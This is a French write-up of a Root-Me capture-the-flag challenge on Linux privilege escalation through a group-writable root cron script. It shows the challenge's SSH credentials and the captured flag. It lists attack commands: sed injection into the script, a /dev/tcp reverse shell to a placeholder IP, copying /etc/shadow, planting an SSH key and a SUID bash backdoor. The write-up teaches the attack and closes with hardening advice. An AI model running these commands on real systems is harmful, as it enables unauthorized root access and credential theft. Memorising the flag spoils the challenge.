# Linux Privesc - Crontab (Root-Me Challenge)

## Informations de connexion

```
Host: sockets.challenges.root-me.pro
Port: 32145
Utilisateur: user
Mot de passe: password
```

### Commande de connexion SSH

```bash
ssh user@sockets.challenges.root-me.pro -p 32145
```

---

## Objectif

Un administrateur système a configuré une tâche cron pour exécuter un script de sauvegarde régulièrement. Exploiter cette configuration pour obtenir un accès root et lire `/root/flag.txt`.

---

## Reconnaissance

### Vérification des tâches cron

```bash
user@challenge:~$ cat /etc/crontab
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root /opt/scripts/backup.sh
```

### Explication du format crontab

```
* * * * * root /opt/scripts/backup.sh
│ │ │ │ │ │    └── Commande à exécuter
│ │ │ │ │ └── Utilisateur (root)
│ │ │ │ └── Jour de la semaine (0-7, 0=dimanche)
│ │ │ └── Mois (1-12)
│ │ └── Jour du mois (1-31)
│ └── Heure (0-23)
└── Minute (0-59)

* = toutes les valeurs possibles
```

**Interprétation :** `* * * * *` = Chaque minute, le script `/opt/scripts/backup.sh` est exécuté en tant que `root`.

### Analyse du script de sauvegarde

```bash
user@challenge:~$ ls -la /opt/scripts/
total 12
drwxrwxr-x 2 root user 4096 Jul 13  2025 .
drwxr-xr-x 1 root root 4096 Jul 13  2025 ..
-rwxrwxr-x 1 root user  674 Jul 13  2025 backup.sh
```

### Explication des permissions

```
-rwxrwxr-x 1 root user
 │││││││││      │    └── Groupe propriétaire: user
 │││││││││      └── Propriétaire: root
 ││││││││└── Autres: exécution (x)
 │││││││└─── Autres: lecture (r)
 ││││││└──── Autres: pas d'écriture (-)
 │││││└───── Groupe: exécution (x)
 ││││└────── Groupe: écriture (w) ← VULNÉRABILITÉ!
 │││└─────── Groupe: lecture (r)
 ││└──────── Propriétaire: exécution (x)
 │└───────── Propriétaire: écriture (w)
 └────────── Propriétaire: lecture (r)
```

**Vulnérabilité :** Le groupe `user` a les droits d'écriture sur le script !

### Contenu original du script

```bash
user@challenge:~$ cat /opt/scripts/backup.sh
#!/bin/bash

# Current date for backup file name
DATE=$(date +%Y%m%d-%H%M%S)

# Backup directory
BACKUP_DIR="/var/backups/system"

# Log file
LOG_FILE="/var/log/backup.log"

echo "[$(date)] Starting backup..." >> $LOG_FILE

# Backup important configuration files
tar -czf $BACKUP_DIR/config_backup_$DATE.tar.gz /etc/passwd /etc/group /etc/shadow /etc/hosts 2>/dev/null

# Verification of the backup
if [ $? -eq 0 ]; then
    echo "[$(date)] Backup completed successfully." >> $LOG_FILE
else
    echo "[$(date)] Error during backup." >> $LOG_FILE
fi

# Clean up old backups (keep the 5 most recent)
ls -t $BACKUP_DIR/config_backup_*.tar.gz | tail -n +6 | xargs -r rm

exit 0
```

---

## Exploitation

### Concept

Puisque l'utilisateur `user` peut modifier le script qui est exécuté par `root` via cron, on peut injecter des commandes malveillantes.

### Étape 1 : Injection de commandes

Utiliser `sed` pour insérer des commandes avant `exit 0` :

```bash
# Ajouter une commande pour copier le flag
sed -i "/exit 0/i cat /root/flag.txt > /tmp/flag.txt" /opt/scripts/backup.sh

# Ajouter une commande pour rendre le fichier lisible
sed -i "/exit 0/i chmod 777 /tmp/flag.txt" /opt/scripts/backup.sh
```

### Vérification du script modifié

```bash
user@challenge:~$ cat /opt/scripts/backup.sh
#!/bin/bash

# Current date for backup file name
DATE=$(date +%Y%m%d-%H%M%S)

# Backup directory
BACKUP_DIR="/var/backups/system"

# Log file
LOG_FILE="/var/log/backup.log"

echo "[$(date)] Starting backup..." >> $LOG_FILE

# Backup important configuration files
tar -czf $BACKUP_DIR/config_backup_$DATE.tar.gz /etc/passwd /etc/group /etc/shadow /etc/hosts 2>/dev/null

# Verification of the backup
if [ $? -eq 0 ]; then
    echo "[$(date)] Backup completed successfully." >> $LOG_FILE
else
    echo "[$(date)] Error during backup." >> $LOG_FILE
fi

# Clean up old backups (keep the 5 most recent)
ls -t $BACKUP_DIR/config_backup_*.tar.gz | tail -n +6 | xargs -r rm

cat /root/flag.txt > /tmp/flag.txt    ← COMMANDE INJECTÉE
chmod 777 /tmp/flag.txt               ← COMMANDE INJECTÉE
exit 0
```

### Étape 2 : Attendre l'exécution du cron

Le cron s'exécute chaque minute. Attendre environ 60 secondes :

```bash
user@challenge:~$ sleep 65
```

### Étape 3 : Lire le flag

```bash
user@challenge:~$ cat /tmp/flag.txt
RM{2d35b5f89c9aa85385c5ec296afb0bc2}
```

---

## Schéma de l'attaque

```
┌─────────────────────────────────────────────────────────────┐
│                    CONFIGURATION INITIALE                   │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  /etc/crontab                                               │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ * * * * * root /opt/scripts/backup.sh               │   │
│  └─────────────────────────────────────────────────────┘   │
│         │                                                   │
│         ▼                                                   │
│  /opt/scripts/backup.sh                                     │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ Permissions: -rwxrwxr-x root user                   │   │
│  │                      ↑                               │   │
│  │               Groupe user peut écrire!               │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                         EXPLOITATION                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Injection de commandes dans backup.sh                   │
│     ┌─────────────────────────────────────────────────┐    │
│     │ cat /root/flag.txt > /tmp/flag.txt              │    │
│     │ chmod 777 /tmp/flag.txt                         │    │
│     └─────────────────────────────────────────────────┘    │
│                          │                                  │
│                          ▼                                  │
│  2. Cron exécute le script en tant que ROOT                 │
│                          │                                  │
│                          ▼                                  │
│  3. /tmp/flag.txt créé avec le contenu du flag              │
│                          │                                  │
│                          ▼                                  │
│  4. Lecture du flag par l'utilisateur                       │
│     ┌─────────────────────────────────────────────────┐    │
│     │ RM{2d35b5f89c9aa85385c5ec296afb0bc2}            │    │
│     └─────────────────────────────────────────────────┘    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Flag

```
RM{2d35b5f89c9aa85385c5ec296afb0bc2}
```

---

## Alternatives d'exploitation

### Méthode 1 : Reverse Shell

```bash
# Ajouter un reverse shell au script
echo "bash -i >& /dev/tcp/VOTRE_IP/4444 0>&1" >> /opt/scripts/backup.sh

# Sur votre machine, écouter :
nc -lvnp 4444
```

### Méthode 2 : Copier /etc/shadow

```bash
sed -i "/exit 0/i cp /etc/shadow /tmp/shadow && chmod 777 /tmp/shadow" /opt/scripts/backup.sh
```

### Méthode 3 : Ajouter une clé SSH

```bash
sed -i "/exit 0/i echo 'VOTRE_CLE_SSH' >> /root/.ssh/authorized_keys" /opt/scripts/backup.sh
```

### Méthode 4 : SUID bash

```bash
sed -i "/exit 0/i cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" /opt/scripts/backup.sh

# Après exécution du cron :
/tmp/rootbash -p
```

---

## Concepts de sécurité

### Emplacements des fichiers cron

| Fichier/Dossier | Description |
|-----------------|-------------|
| `/etc/crontab` | Crontab système principal |
| `/etc/cron.d/` | Fichiers cron additionnels |
| `/etc/cron.hourly/` | Scripts exécutés chaque heure |
| `/etc/cron.daily/` | Scripts exécutés chaque jour |
| `/etc/cron.weekly/` | Scripts exécutés chaque semaine |
| `/etc/cron.monthly/` | Scripts exécutés chaque mois |
| `/var/spool/cron/crontabs/` | Crontabs des utilisateurs |

### Comment sécuriser les tâches cron

1. **Permissions strictes sur les scripts** :
   ```bash
   chmod 700 /opt/scripts/backup.sh
   chown root:root /opt/scripts/backup.sh
   ```

2. **Utiliser des chemins absolus** dans les scripts

3. **Vérifier régulièrement les permissions** :
   ```bash
   find /opt/scripts -perm -o+w -type f
   ```

4. **Logs et monitoring** des modifications

---

## Commandes utiles

```bash
# Voir toutes les tâches cron système
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/

# Voir les crontabs des utilisateurs
crontab -l
sudo crontab -u root -l

# Trouver les scripts modifiables
find / -perm -o+w -type f 2>/dev/null
find / -perm -g+w -group $(id -gn) -type f 2>/dev/null

# Surveiller les logs cron
tail -f /var/log/syslog | grep CRON

# Insérer une ligne avant un pattern avec sed
sed -i "/pattern/i nouvelle_ligne" fichier
```

---

## Ressources

- [GTFOBins - Cron](https://gtfobins.github.io/)
- `man 5 crontab` - Format du fichier crontab
- `man cron` - Daemon cron
